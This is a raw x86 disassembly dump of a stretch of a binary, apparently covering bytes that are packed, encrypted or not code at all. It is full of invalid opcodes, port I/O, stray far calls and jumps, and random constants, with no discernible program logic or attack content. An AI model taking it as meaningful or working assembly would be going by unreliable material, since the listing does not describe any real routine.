  4175bc:	icebp  
  4175bd:	xchg   ebp,eax
  4175be:	das    
  4175bf:	mov    bl,0x77
  4175c1:	clc    
  4175c2:	mov    edi,0x2e31ce32
  4175c7:	mov    BYTE PTR [ecx+0x7e],0x2d
  4175cb:	addr16 cmp eax,0x3d06a562
  4175d1:	loopne 0x4175de
  4175d3:	call   0x9a4f:0x191a34d3
  4175da:	leave  
  4175db:	jne    0x4175e6
  4175dd:	popa   
  4175de:	sbb    dh,BYTE PTR [esi-0x5c8f96b8]
  4175e4:	in     al,0xe5
  4175e6:	out    dx,eax
  4175e7:	dec    edx
  4175e8:	mov    ebp,0x9ec79311
  4175ed:	xchg   BYTE PTR [ebp+0x6cb2b1d0],ah
  4175f3:	nop
  4175f4:	adc    al,0x29
  4175f6:	inc    ebx
  4175f7:	xchg   edi,eax
  4175f8:	ss inc ecx
  4175fa:	test   eax,0xc4bb5809
  4175ff:	xor    eax,0xbfc1ea34
  417604:	cmp    DWORD PTR [esi-0x1],0xaed2cee1
  41760b:	mov    bl,0x4e
  41760d:	cwde   
  41760e:	xor    ecx,DWORD PTR [eax+0x6e8eada]
  417614:	sahf   
  417615:	sub    al,0x25
  417617:	adc    BYTE PTR [ebx],ch
  417619:	fimul  WORD PTR [edi]
  41761b:	mov    WORD PTR [edi],cs
  41761d:	mov    ecx,0x6621314
  417622:	sbb    al,0xf1
  417624:	aas    
  417625:	loope  0x417661
  417627:	mov    ecx,0xbffd87f4
  41762c:	xchg   edx,eax
  41762d:	inc    edi
  41762e:	xchg   edx,ebx
  417630:	aaa    
  417631:	xchg   edx,eax
  417632:	test   bl,bh
  417634:	push   es
  417635:	or     bh,BYTE PTR [edi+0x4]
  417638:	out    dx,al
  417639:	mov    ecx,0x44f89bc2
  41763e:	dec    esp
  41763f:	popf   
  417640:	aad    0x3f
  417642:	or     edi,edx
  417644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417645:	sbb    BYTE PTR [ecx+0x3b],0xb4
  417649:	jmp    0x41763c
  41764b:	dec    edi
  41764c:	cdq    
  41764d:	cmp    bh,bl
  41764f:	(bad)  
  417651:	daa    
  417652:	ficom  WORD PTR [edi+eiz*4]
  417655:	or     BYTE PTR [edx],0x32
  417658:	(bad)  
  417659:	rol    DWORD PTR [eax-0x880159c],1
  41765f:	ror    ebp,0x44
  417662:	popf   
  417663:	add    DWORD PTR [edi+0x47],esp
  417666:	dec    eax
  417667:	sub    ch,BYTE PTR [edi+0x41]
  41766a:	xor    al,0x9c
  41766c:	add    cl,BYTE PTR [ebp-0x22]
  41766f:	scas   al,BYTE PTR es:[edi]
  417670:	pop    ss
  417671:	inc    esp
  417672:	mov    cl,0xad
  417674:	sbb    al,BYTE PTR [eax]
  417676:	test   al,0xd6
  417678:	sbb    edx,ecx
  41767a:	or     ebp,DWORD PTR [edi-0xb44fec7]
  417680:	(bad)  
  417681:	pop    esi
  417682:	ja     0x4176c9
  417684:	leave  
  417685:	mov    esp,0xef124c0
  41768a:	jno    0x417616
  41768c:	mov    bl,0xd9
  41768e:	sbb    bh,ah
  417690:	inc    ebx
  417691:	mov    cl,0xde
  417693:	and    eax,0xe5ba5cf5
  417698:	xchg   DWORD PTR [ecx],edx
  41769a:	call   0x357c:0x84614c2d
  4176a1:	imul   esi,DWORD PTR [edi],0x43
  4176a4:	xlat   BYTE PTR ds:[ebx]
  4176a5:	mov    dh,0x45
  4176a7:	cmp    eax,0xc9f6eabd
  4176ac:	add    cl,BYTE PTR [ecx+0x7d]
  4176af:	dec    esi
  4176b0:	jg     0x41770f
  4176b2:	and    eax,0x83df6378
  4176b7:	adc    BYTE PTR [esi-0x260dcefc],0x6c
  4176be:	sbb    dh,0xe8
  4176c1:	in     al,dx
  4176c2:	leave  
  4176c3:	xor    al,0xbc
  4176c5:	mov    ebx,0xc65fb394
  4176ca:	test   ebx,edx
  4176cc:	stos   BYTE PTR es:[edi],al
  4176cd:	sbb    ch,al
  4176cf:	fistp  WORD PTR [edi+ecx*4]
  4176d2:	or     BYTE PTR [ecx],bl
  4176d4:	scas   eax,DWORD PTR es:[edi]
  4176d5:	loope  0x4176c3
  4176d7:	icebp  
  4176d8:	jnp    0x41774a
  4176da:	jp     0x4176e6
  4176dc:	sar    DWORD PTR [ebx-0x5587b1c],1
  4176e2:	mov    ah,0x82
  4176e4:	inc    ecx
  4176e5:	inc    ebp
  4176e6:	test   eax,0x9ed46768
  4176eb:	test   eax,0x44fcabb5
  4176f0:	fldcw  WORD PTR [ecx]
  4176f2:	jmp    0x14330616
  4176f7:	icebp  
  4176f8:	cmp    al,0x60
  4176fa:	retf   
  4176fb:	xor    eax,0xf959b523
  417700:	push   edx
  417701:	sub    eax,0xfa6b473a
  417706:	fst    QWORD PTR [ecx-0x26cbcf41]
  41770c:	push   ebp
  41770d:	adc    al,dh
  41770f:	(bad)  
  417710:	cvtpi2ps xmm3,QWORD PTR [esi]
  417713:	mov    ebp,0x7b961281
  417718:	out    dx,al
  417719:	pop    edi
  41771a:	mov    ecx,0xe570eaa3
  41771f:	mov    al,ds:0xb867df6b
  417724:	jbe    0x417716
  417726:	(bad)  
  417727:	jne    0x417766
  417729:	xchg   ebx,eax
  41772a:	adc    eax,0x99113986
  41772f:	aad    0xb0
  417731:	mov    eax,ds:0xc6c17e5d
  417736:	pop    esi
  417737:	adc    eax,0xccbc899c
  41773c:	sub    ebx,ecx
  41773e:	pop    esi
  41773f:	add    DWORD PTR [esp+ebp*2],ebx
  417742:	shl    dl,1
  417744:	sub    DWORD PTR [edi-0x17],eax
  417747:	mov    BYTE PTR [ebp+0x2c6067b4],bh
  41774d:	sub    ebp,eax
  41774f:	dec    edx
  417750:	cmc    
  417751:	stc    
  417752:	cmp    DWORD PTR [ebx+0x76],ebp
  417755:	hlt    
  417756:	fadd   DWORD PTR [edx+0x2b]
  417759:	xor    ebp,ebp
  41775b:	rcl    DWORD PTR [esi-0x6],cl
  41775e:	and    al,0x93
  417760:	push   esi
  417761:	rcpps  xmm3,XMMWORD PTR [eax+0x1445341f]
  417768:	retf   0xc792
  41776b:	xchg   DWORD PTR [esi-0x50],esi
  41776e:	ss in  al,0x0
  417771:	jle    0x417787
  417773:	push   edx
  417774:	mov    ah,0x47
  417776:	test   DWORD PTR [ebp-0x2c],edi
  417779:	sbb    eax,0xf61bb701
  41777e:	or     BYTE PTR [ecx+edi*4+0x7],dh
  417782:	fisub  WORD PTR [esi-0x6c]
  417785:	pop    ebp
  417786:	ficom  DWORD PTR [ecx-0x76c52e51]
  41778c:	test   ch,bh
  41778e:	stos   DWORD PTR es:[edi],eax
  41778f:	adc    ebx,ebp
  417791:	sbb    ebp,DWORD PTR [eax+0x54]
  417794:	and    ch,bh
  417796:	xchg   edx,eax
  417797:	push   edi
  417798:	les    esi,FWORD PTR [edi-0x1aada1d6]
  41779e:	jp     0x417754
  4177a0:	jno    0x41781b
  4177a2:	jge    0x417804
  4177a4:	in     al,dx
  4177a5:	aas    
  4177a6:	add    al,0xc1
  4177a8:	xchg   esp,eax
  4177a9:	mov    BYTE PTR [ecx],bh
  4177ab:	xlat   BYTE PTR ds:[ebx]
  4177ac:	in     al,0xc5
  4177ae:	js     0x417758
  4177b0:	xchg   ecx,eax
  4177b1:	scas   eax,DWORD PTR es:[edi]
  4177b2:	pop    eax
  4177b3:	sbb    bh,BYTE PTR [eax-0x53ecfe26]
  4177b9:	lods   eax,DWORD PTR ds:[esi]
  4177ba:	xor    bh,ah
  4177bc:	mov    eax,ds:0xc75fa1f8
  4177c1:	and    eax,0xf49af29d
  4177c6:	dec    esi
  4177c7:	loope  0x4177e1
  4177c9:	xor    eax,ecx
  4177cb:	xor    eax,0x37365fff
  4177d0:	cld    
  4177d1:	inc    eax
  4177d2:	(bad)  
  4177d3:	xrelease mov DWORD PTR [edx-0x21563873],edi
  4177da:	aas    
  4177db:	ja     0x4177c4
  4177dd:	add    eax,0xde0b7ef1
  4177e2:	es out dx,al
  4177e4:	sti    
  4177e5:	pop    ss
  4177e6:	jns    0x4177ce
  4177e8:	adc    BYTE PTR [esi+0x1a],dl
  4177eb:	fadd   DWORD PTR [eax+0x18]
  4177ee:	push   ebx
  4177ef:	push   cs
  4177f0:	add    bl,bl
  4177f2:	and    BYTE PTR [edi],bl
  4177f4:	jp     0x417798
  4177f6:	and    BYTE PTR [esi-0x37],al
  4177f9:	xor    DWORD PTR [ebx-0x71fcf2db],eax
  4177ff:	jnp    0x4177c3
  417801:	dec    ebp
  417802:	mov    bh,BYTE PTR ds:0x36212e9a
  417808:	jp     0x4177e5
  41780a:	aam    0xa8
  41780c:	pushf  
  41780d:	daa    
  41780e:	call   0x664c:0x87445412
  417815:	dec    esp
  417816:	mov    edx,0xc8e977af
  41781b:	loopne 0x417843
  41781d:	sar    DWORD PTR [esi-0x761947a6],1
  417823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417824:	(bad)  
  417825:	jge    0x41788f
  417827:	push   eax
  417828:	push   ds
  417829:	arpl   bp,bx
  41782b:	xor    eax,0xfecf264e
  417830:	xor    al,0x51
  417832:	cmp    BYTE PTR [esi+esi*8-0x4349011f],bl
  417839:	mov    ch,0xf8
  41783b:	or     DWORD PTR [edx+0x2ab77d10],esi
  417841:	push   0xf2f7b407
  417846:	out    0x34,al
  417848:	outs   dx,DWORD PTR ds:[esi]
  417849:	(bad)  [edx+0x4e]
  41784c:	cs sti 
  41784e:	fimul  DWORD PTR [edi]
  417850:	iret   
  417851:	xor    al,0xab
  417853:	mov    eax,ds:0x20d85574
  417858:	in     al,0xcb
  41785a:	pushf  
  41785b:	pop    ecx
  41785c:	pop    edx
  41785d:	xor    BYTE PTR [edx],0x94
  417860:	adc    al,0xe9
  417862:	addr16 mov ds:0x6acf,eax
  417866:	pop    ebx
  417867:	adc    BYTE PTR [eax+edi*1+0x2e],cl
  41786b:	loop   0x41782f
  41786d:	xor    al,0xba
  41786f:	and    eax,0xc0cdba3d
  417874:	xchg   edi,eax
  417875:	adc    al,0xf2
  417877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417878:	scas   al,BYTE PTR es:[edi]
  417879:	adc    al,0xf9
  41787b:	pop    ebp
  41787c:	rcl    DWORD PTR [ebp-0x225f1967],1
  417882:	leave  
  417883:	dec    esp
  417884:	adc    DWORD PTR [ebp-0x2a],esp
  417887:	and    BYTE PTR [edi],0xdf
  41788a:	push   0x17972cfe
  41788f:	pusha  
  417890:	imul   BYTE PTR [ecx+0x48]
  417893:	add    BYTE PTR [eax+0x5d586e93],ch
  417899:	outs   dx,BYTE PTR ds:[esi]
  41789a:	jmp    0xfb06:0x51651a16
  4178a1:	inc    ebx
  4178a2:	(bad)  [ebx-0x29acd291]
  4178a8:	(bad)  
  4178a9:	jmp    0x791b:0xd92db864
  4178b0:	xor    eax,0x89011611
  4178b5:	test   BYTE PTR ds:0x7fd48562,0x8e
  4178bc:	dec    ch
  4178be:	lock rcr BYTE PTR [esi],cl
  4178c1:	not    BYTE PTR [ecx+0x4d5cb2dd]
  4178c7:	mov    bh,0x83
  4178c9:	sub    ebx,ebx
  4178cb:	mov    al,ds:0xf0555a96
  4178d0:	inc    eax
  4178d2:	aas    
  4178d3:	cmovno ecx,DWORD PTR [ebp+edi*8+0x4332a79f]
  4178db:	jle    0x41790e
  4178dd:	pop    ebx
  4178de:	sub    ah,BYTE PTR [esi+0x74f6932b]
  4178e4:	pop    ss
  4178e5:	fwait
  4178e6:	add    edi,DWORD PTR [ebx-0x29]
  4178e9:	aas    
  4178ea:	fidivr DWORD PTR [ecx+0x4e698999]
  4178f0:	test   al,0x8b
  4178f2:	ins    BYTE PTR es:[edi],dx
  4178f3:	iret   
  4178f4:	push   ebx
  4178f5:	adc    bh,BYTE PTR [eax]
  4178f7:	in     al,dx
  4178f8:	xchg   edx,eax
  4178f9:	or     dh,dh
  4178fb:	arpl   WORD PTR [ebp+ebp*2-0x7c],cx
  4178ff:	sub    edi,ebp
  417901:	xchg   edx,eax
  417902:	ja     0x417899
  417904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417905:	sbb    ebx,ecx
  417907:	rol    ebp,1
  417909:	iret   
  41790a:	scas   al,BYTE PTR es:[edi]
  41790b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41790c:	stos   DWORD PTR es:[edi],eax
  41790d:	or     dl,BYTE PTR [esp]
  417910:	(bad)  
  417911:	lea    ebp,[edx+eax*4]
  417914:	sahf   
  417915:	or     DWORD PTR ds:0x2b32972c,edx
  41791b:	ss pop ss
  41791d:	mov    gs,WORD PTR [edi+0x39]
  417920:	or     BYTE PTR [ebp-0x1c],ch
  417923:	or     ebx,ebx
  417925:	in     eax,0xfe
  417927:	out    dx,al
  417928:	xchg   edx,eax
  417929:	scas   al,BYTE PTR es:[edi]
  41792a:	mov    bl,0x4
  41792c:	(bad)  
  41792d:	pop    ebp
  41792e:	mov    esi,0x95145ab6
  417933:	(bad)  [ebx-0x5b]
  417936:	dec    eax
  417937:	ins    BYTE PTR es:[edi],dx
  417938:	push   esp
  417939:	fwait
  41793a:	ins    DWORD PTR es:[edi],dx
  41793b:	shl    DWORD PTR [esi],cl
  41793d:	jmp    0xf89678fa
  417942:	sahf   
  417943:	dec    ebx
  417945:	or     bl,ch
  417947:	push   ss
  417948:	cmp    BYTE PTR [edi+0x58685c0d],bl
  41794e:	sub    BYTE PTR [edx-0x8],bl
  417951:	icebp  
  417952:	and    ebx,DWORD PTR [eax+0x35f6ccdb]
  417958:	dec    eax
  417959:	xchg   edi,eax
  41795a:	(bad)  
  41795b:	out    0xc3,eax
  41795d:	pusha  
  41795e:	cwde   
  41795f:	jecxz  0x41791a
  417961:	paddusb mm6,QWORD PTR [esi-0x55e3f8f0]
  417968:	xchg   edx,eax
  417969:	dec    edx
  41796a:	dec    DWORD PTR [esp+ebp*1-0x6f]
  41796e:	lea    ebx,[edi]
  417970:	leave  
  417971:	mov    eax,ds:0x50d88e42
  417976:	lahf   
  417977:	push   ds
  417978:	outs   dx,BYTE PTR ds:[esi]
  417979:	jne    0x4179b3
  41797b:	es ja  0x4179d8
  41797e:	push   cs
  41797f:	lock adc esp,DWORD PTR [ebp+0x62]
  417983:	int3   
  417984:	or     al,0x91
  417986:	mov    al,ds:0x3ee154f2
  41798b:	push   eax
  41798c:	cmp    DWORD PTR [ebx-0x63e6fe5],esp
  417992:	data16 arpl ax,ax
  417995:	push   esp
  417996:	cmp    esp,esi
  417998:	jmp    0x4179af
  41799a:	in     eax,0xf0
  41799c:	dec    esi
  41799d:	(bad)  
  41799e:	or     eax,0x182614dd
  4179a3:	mov    ds:0xa007a961,al
  4179a8:	das    
  4179a9:	or     dl,BYTE PTR [eax+0x6afbaa2e]
  4179af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179b0:	std    
  4179b1:	sbb    DWORD PTR [ecx+0x15aa52e0],eax
  4179b7:	adc    ecx,DWORD PTR [edi]
  4179b9:	sub    al,0x2b
  4179bb:	mov    DWORD PTR [edi],eax
  4179bd:	pop    ds
  4179be:	in     eax,0x9f
  4179c0:	fstp   QWORD PTR [ebp+0x29]
  4179c3:	push   eax
  4179c4:	(bad)  
  4179c5:	je     0x417a45
  4179c7:	les    ecx,FWORD PTR [edi]
  4179c9:	in     al,dx
  4179ca:	bound  ecx,QWORD PTR [esi+0x4b2f47f]
  4179d0:	dec    ebx
  4179d1:	xor    DWORD PTR [ebx+0x2cdaa751],edx
  4179d7:	sahf   
  4179d8:	mov    dl,0x80
  4179da:	pop    ecx
  4179db:	or     ebp,edi
  4179dd:	test   esi,0x8a7f1b65
  4179e3:	int3   
  4179e4:	jmp    0xc7edaa94
  4179e9:	push   0x1
  4179eb:	aas    
  4179ec:	and    eax,0x7c9116d1
  4179f1:	pop    esi
  4179f2:	adc    bl,BYTE PTR [ecx+0x46]
  4179f5:	sub    DWORD PTR [ebx+0x34],ebp
  4179f8:	and    al,0x4
  4179fa:	int    0x93
  4179fc:	mov    al,0xcc
  4179fe:	mul    DWORD PTR [edi-0xf]
  417a01:	lock sbb eax,0x5e589c4d
  417a07:	and    eax,0xe0cd4fe1
  417a0c:	or     DWORD PTR [ecx],edi
  417a0e:	mov    es,WORD PTR [ebp+0x20a3d93c]
  417a14:	push   edx
  417a15:	fldlg2 
  417a17:	pop    ecx
  417a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a19:	xchg   ebx,eax
  417a1a:	add    ah,BYTE PTR [esi-0x4b589960]
  417a20:	adc    eax,DWORD PTR [esi]
  417a22:	test   eax,0xc8ee6956
  417a27:	in     eax,0x1d
  417a29:	in     eax,dx
  417a2a:	xor    DWORD PTR [ecx+0x37],0x7749030d
  417a31:	fmul   st,st(3)
  417a33:	jmp    0xa6713f0f
  417a38:	xchg   BYTE PTR [edx],bl
  417a3a:	push   0x9259dca1
  417a3f:	cli    
  417a40:	daa    
  417a41:	imul   esi,ebp,0x1c
  417a44:	push   ecx
  417a45:	mov    al,0xfa
  417a47:	mov    cl,0x69
  417a49:	lods   eax,DWORD PTR ds:[esi]
  417a4a:	scas   al,BYTE PTR es:[edi]
  417a4b:	stos   BYTE PTR es:[edi],al
  417a4c:	inc    ecx
  417a4d:	or     DWORD PTR [ebx+0xfc18893],ebx
  417a53:	mov    ah,0xb8
  417a55:	xor    DWORD PTR [ebx],esp
  417a57:	in     al,0x62
  417a59:	add    eax,0xffffffee
  417a5c:	sub    DWORD PTR [edx+esi*1-0x35],ebx
  417a60:	in     eax,dx
  417a61:	push   es
  417a62:	sub    eax,0x24fab8f6
  417a67:	ficomp DWORD PTR [ebp+edi*2-0x66e0c542]
  417a6e:	je     0x417a23
  417a70:	mov    ebx,0xc4e93af0
  417a75:	popa   
  417a76:	pop    ss
  417a77:	clc    
  417a78:	push   esp
  417a79:	rcl    BYTE PTR [ebx-0x34],0xfd
  417a7d:	inc    esp
  417a7e:	xor    dl,ch
  417a80:	sub    DWORD PTR [edx+0x77b42066],esp
  417a86:	or     eax,ecx
  417a88:	adc    eax,0xf09f6a3a
  417a8d:	pusha  
  417a8e:	adc    ah,0x70
  417a91:	(bad)  
  417a92:	int    0xfe
  417a94:	je     0x417a98
  417a96:	stos   DWORD PTR es:[edi],eax
  417a97:	lea    esp,[ebp+0x35bf0873]
  417a9d:	gs lahf 
  417a9f:	cdq    
  417aa0:	inc    eax
  417aa1:	je     0x417a9d
  417aa3:	nop
  417aa4:	aam    0x4b
  417aa6:	imul   BYTE PTR [eax+0x70]
  417aa9:	pop    esp
  417aaa:	call   0x76f4db14
  417aaf:	and    eax,DWORD PTR [ebx+ecx*1]
  417ab2:	inc    esp
  417ab3:	fcmovnu st,st(6)
  417ab5:	push   ebx
  417ab6:	inc    edx
  417ab7:	inc    ebp
  417ab8:	lahf   
  417ab9:	pushf  
  417aba:	loopne 0x417ad4
  417abc:	imul   BYTE PTR [edx-0x2bb02c7b]
  417ac2:	mov    eax,0xb49f062e
  417ac7:	and    ch,dh
  417ac9:	hlt    
  417aca:	scas   eax,DWORD PTR es:[edi]
  417acb:	pop    esp
  417acc:	rcr    DWORD PTR [esi],cl
  417ace:	int    0xc0
  417ad0:	fbld   TBYTE PTR [esi+0x4559337d]
  417ad6:	mul    ebp
  417ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ad9:	inc    eax
  417ada:	lock push ecx
  417adc:	jge    0x417af0
  417ade:	aad    0x10
  417ae0:	xchg   BYTE PTR [edi+0x57],cl
  417ae3:	sbb    BYTE PTR [edx],ch
  417ae5:	popf   
  417ae6:	xor    BYTE PTR [ecx+0x29],ah
  417ae9:	inc    eax
  417aea:	mov    esp,0x23e75b76
  417aef:	hlt    
  417af0:	and    al,0x5a
  417af2:	lea    esp,[esi]
  417af4:	cmp    BYTE PTR ds:0x84461bf4,al
  417afa:	jmp    0x417b72
  417afc:	adc    dl,bh
  417afe:	cmp    ah,al
  417b00:	int    0x8a
  417b02:	fnsave [ebp-0x1f]
  417b05:	fcomp  QWORD PTR [ecx]
  417b07:	and    ebp,DWORD PTR [edx+0x1e08dd65]
  417b0d:	leave  
  417b0e:	inc    ecx
  417b0f:	fdivr  st(5),st
  417b11:	inc    esp
  417b12:	mov    eax,0xd0620fdc
  417b17:	and    ebp,DWORD PTR [ecx]
  417b19:	cmp    DWORD PTR [eax-0x8c02472],ebx
  417b1f:	mov    ebx,0x180110b6
  417b24:	out    0xcb,al
  417b26:	xchg   ebx,eax
  417b27:	lock mov ah,BYTE PTR [ebx-0xf]
  417b2b:	and    BYTE PTR [eax],0xaf
  417b2e:	mov    edi,0x3228f49f
  417b33:	pop    ds
  417b34:	mov    ebp,0x6d6c196c
  417b39:	mov    esi,0x1a890224
  417b3e:	test   BYTE PTR ds:0xbd535336,al
  417b44:	push   0xb521d053
  417b49:	and    bh,BYTE PTR [edi-0x6d]
  417b4c:	repnz outs dx,DWORD PTR ds:[esi]
  417b4e:	fwait
  417b4f:	aad    0x57
  417b51:	(bad)  
  417b52:	cwde   
  417b53:	pop    edx
  417b54:	sahf   
  417b55:	out    dx,eax
  417b56:	jg     0x417bcc
  417b58:	sub    cl,BYTE PTR [ecx]
  417b5a:	adc    DWORD PTR [esi-0x1a4572b5],0x52b807bd
  417b64:	sub    DWORD PTR [esi-0x1c28cbbf],ebx
  417b6a:	inc    edi
  417b6b:	inc    esp
  417b6c:	fs scas al,BYTE PTR es:[edi]
  417b6e:	sbb    BYTE PTR [ecx],al
  417b70:	mov    ah,0x5f
  417b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b73:	inc    edi
  417b74:	test   eax,0xf97f42d4
  417b79:	adc    edx,DWORD PTR [edi+0x2c4b6f54]
  417b7f:	push   ds
  417b80:	mov    bh,0xb8
  417b82:	mov    eax,0x182e746a
  417b87:	push   esp
  417b88:	add    eax,0xa3e0dad7
  417b8d:	xlat   BYTE PTR ds:[ebx]
  417b8e:	mov    cs,WORD PTR [esi-0x25dab54c]
  417b94:	jecxz  0x417bff
  417b96:	and    DWORD PTR [eax+eax*1-0x75111b58],ebp
  417b9d:	mov    ds:0xb621f6b,al
  417ba2:	adc    ebp,esi
  417ba4:	jle    0x417b30
  417ba6:	xor    bl,bl
  417ba8:	add    eax,0xe541e82a
  417bad:	jl     0x417c07
  417baf:	and    BYTE PTR [ebp-0x3e462977],bh
  417bb5:	jl     0x417b87
  417bb7:	and    dh,BYTE PTR [ebp+0x576ca135]
  417bbd:	jg     0x417bfd
  417bbf:	mov    eax,0x13a6790c
  417bc4:	adc    al,0xc2
  417bc6:	xchg   esi,eax
  417bc7:	leave  
  417bc8:	addr16 push esi
  417bca:	jo     0x417bc9
  417bcc:	sub    DWORD PTR [ebp-0x46],edi
  417bcf:	leave  
  417bd0:	inc    ecx
  417bd1:	jb     0x417b61
  417bd3:	icebp  
  417bd4:	add    eax,0x2d920400
  417bd9:	and    DWORD PTR [edi+0x6d9b6423],0xffffffc6
  417be0:	mov    dh,0xaa
  417be2:	mov    cl,0x69
  417be4:	and    eax,0xc6b497b9
  417be9:	cs loope 0x417c02
  417bec:	push   esp
  417bed:	and    esi,0x67
  417bf0:	inc    esi
  417bf1:	inc    esp
  417bf2:	jne    0x417bfe
  417bf4:	test   eax,0xa159195a
  417bf9:	jl     0x417be8
  417bfb:	and    eax,0x93b63d88
  417c00:	adc    ah,BYTE PTR [esi-0x30]
  417c03:	and    al,0x9c
  417c05:	jl     0x417c03
  417c07:	push   edi
  417c08:	mov    ecx,0xa55f444
  417c0d:	rcr    BYTE PTR ds:0xb6f9421,cl
  417c13:	jle    0x417be9
  417c15:	mov    ds:0x9bb54c50,al
  417c1a:	ds cmp eax,0xa4cebc28
  417c20:	fcmovnb st,st(2)
  417c22:	dec    esp
  417c23:	sar    BYTE PTR [eax-0x5a7a1e61],1
  417c29:	push   ds
  417c2a:	sti    
  417c2b:	and    BYTE PTR ds:0x53e5dd4b,ah
  417c31:	and    al,0xdb
  417c33:	div    BYTE PTR [eax-0x1b80599d]
  417c39:	xchg   ebp,eax
  417c3a:	push   0xffffffcc
  417c3c:	jbe    0x417c0e
  417c3e:	pushf  
  417c3f:	aaa    
  417c40:	push   cs
  417c41:	xchg   edi,eax
  417c42:	jp     0x417c1f
  417c44:	push   0xac116eb9
  417c49:	mov    gs,WORD PTR [ecx-0x12]
  417c4c:	clc    
  417c4d:	imul   edi,eax,0x1442eb14
  417c53:	dec    edi
  417c54:	into   
  417c55:	add    dl,BYTE PTR [ecx+0x1c]
  417c58:	xchg   esi,eax
  417c59:	or     bh,BYTE PTR ds:0xbe1efe82
  417c5f:	test   al,0x84
  417c61:	sti    
  417c62:	jnp    0x417cb6
  417c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c65:	mov    dh,0xa9
  417c67:	add    DWORD PTR [ecx+0x581d3000],edx
  417c6d:	lds    ebx,FWORD PTR [esi]
  417c6f:	outs   dx,BYTE PTR ds:[esi]
  417c70:	fs push ebp
  417c72:	sbb    BYTE PTR [ebx+0x5a42e45],dl
  417c78:	pop    es
  417c79:	mov    dl,0xd1
  417c7b:	test   eax,0xc065d4a6
  417c80:	jns    0x417ca8
  417c82:	and    BYTE PTR [eax-0x49],al
  417c85:	push   ebp
  417c86:	mov    DWORD PTR [ebx+edx*2+0x1f],esi
  417c8a:	xor    BYTE PTR [esi-0x467c2ef4],0x45
  417c91:	cdq    
  417c92:	jmp    0x6baed6fa
  417c97:	mov    ah,0x5d
  417c99:	sbb    al,0x54
  417c9b:	mov    cs,ebx
  417c9d:	dec    ebx
  417c9e:	dec    eax
  417c9f:	aam    0x7
  417ca1:	pop    edi
  417ca2:	ins    BYTE PTR es:[edi],dx
  417ca3:	jmp    0xc959:0xeb3dbd5a
  417caa:	lods   eax,DWORD PTR ds:[esi]
  417cab:	in     eax,0xd9
  417cad:	jp     0x417c98
  417caf:	lods   eax,DWORD PTR ds:[esi]
  417cb0:	push   es
  417cb1:	cmp    BYTE PTR ds:0xcfeeaf7,al
  417cb7:	outs   dx,BYTE PTR ds:[esi]
  417cb8:	xor    DWORD PTR [ecx-0x2d9756c9],edx
  417cbe:	mov    dh,0x20
  417cc0:	ror    DWORD PTR [edx+0x63cbf073],cl
  417cc6:	mov    bh,0x5c
  417cc8:	sbb    eax,0x2f823f4a
  417ccd:	in     al,0x35
  417ccf:	sbb    BYTE PTR [edi+0x46e14147],al
  417cd5:	out    dx,al
  417cd6:	and    ebx,eax
  417cd8:	sbb    DWORD PTR [edx],0x64b0781
  417cde:	add    eax,edx
  417ce0:	or     al,0xd0
  417ce2:	cs fild WORD PTR ss:[ecx+0x346a8697]
  417cea:	mov    ebx,0x650c1744
  417cef:	push   esp
  417cf0:	lea    edx,[ecx]
  417cf2:	out    0xd,eax
  417cf4:	scas   eax,DWORD PTR es:[edi]
  417cf5:	add    al,0x24
  417cf7:	add    DWORD PTR [ecx+0x5cf73380],esp
  417cfd:	pop    es
  417cfe:	xchg   esi,eax
  417cff:	or     al,0x3d
  417d01:	pop    ds
  417d02:	sbb    bl,BYTE PTR ds:0x5043f167
  417d08:	jge    0x417ce8
  417d0a:	mov    ch,0x8c
  417d0c:	jno    0x417cf5
  417d0e:	enter  0xd29c,0x55
  417d12:	dec    eax
  417d13:	repnz clc 
  417d15:	and    ebx,DWORD PTR [edi+ecx*1]
  417d18:	push   ecx
  417d19:	aam    0x95
  417d1b:	sbb    DWORD PTR [esi-0x6d8de618],esp
  417d21:	das    
  417d22:	stc    
  417d23:	cmp    dl,BYTE PTR [esi]
  417d25:	xchg   BYTE PTR [ebx],ch
  417d27:	das    
  417d28:	xchg   esp,eax
  417d29:	scas   eax,DWORD PTR es:[edi]
  417d2a:	push   es
  417d2b:	add    al,0x9a
  417d2d:	or     bh,BYTE PTR [esp+edx*4]
  417d30:	inc    ecx
  417d31:	pop    ecx
  417d32:	xor    DWORD PTR [ecx-0xcbecaa6],eax
  417d38:	dec    ebp
  417d39:	adc    edi,0x687b9805
  417d3f:	xchg   ebx,eax
  417d40:	(bad)  
  417d41:	jne    0x417ceb
  417d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d44:	sub    ecx,DWORD PTR [edi-0x3d]
  417d47:	cvtps2pd xmm1,QWORD PTR [ecx]
  417d4a:	mov    eax,ds:0x9b413b32
  417d4f:	popa   
  417d50:	adc    ecx,DWORD PTR [edx+ebx*4+0x14181850]
  417d57:	cwde   
  417d58:	dec    ebx
  417d59:	adc    eax,0xde067368
  417d5e:	aaa    
  417d5f:	sti    
  417d60:	adc    BYTE PTR [ebx+0x79de03f0],dh
  417d66:	js     0x417db9
  417d68:	into   
  417d69:	add    al,0x97
  417d6b:	mov    dh,0xaa
  417d6d:	rcl    BYTE PTR [esi-0x45],0x4
  417d71:	mov    esi,DWORD PTR [esi]
  417d73:	out    0x2a,al
  417d75:	jns    0x417d16
  417d77:	int    0x77
  417d79:	call   0x2d13:0xa6e7ba69
  417d80:	add    ecx,DWORD PTR [esi+0x423c6ee7]
  417d86:	inc    esp
  417d87:	gs inc eax
  417d89:	aaa    
  417d8a:	jnp    0x417dc1
  417d8c:	repnz addr16 sbb edx,edi
  417d90:	jp     0x417d93
  417d92:	rcr    DWORD PTR [edi],0x4a
  417d95:	sbb    BYTE PTR [edx-0x6189b33a],ch
  417d9b:	mov    ecx,0xa34c2cb6
  417da0:	dec    edi
  417da1:	adc    BYTE PTR [ebx+esi*1],dl
  417da4:	sbb    eax,0x40758950
  417da9:	gs into 
  417dab:	mov    cl,0x54
  417dad:	xchg   ebp,eax
  417dae:	outs   dx,BYTE PTR ds:[esi]
  417daf:	scas   al,BYTE PTR es:[edi]
